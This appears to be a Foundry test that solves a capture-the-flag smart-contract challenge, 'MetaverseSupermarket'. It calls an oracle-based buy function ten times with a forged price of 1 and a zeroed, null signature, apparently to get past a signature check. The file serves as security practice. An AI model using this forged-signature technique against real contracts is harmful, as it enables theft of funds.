// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/02-MetaverseSupermarket.sol";

contract MetaverseSupermarketTest is Test {
    InflaStore public inflaStore;
    address player;

    function setUp() public {
        player = makeAddr("player");
        inflaStore = new InflaStore(player);
    }

    function test() public {
        vm.startPrank(player);
        inflaStore.infla().approve(address(inflaStore), 10);
        OraclePrice memory oraclePrice = OraclePrice(block.number, 1);
        Signature memory signature = Signature(27, bytes32(0), bytes32(0));
        for (uint256 i = 0; i < 10; i++) {
            inflaStore.buyUsingOracle(oraclePrice, signature);
        }
    }
}
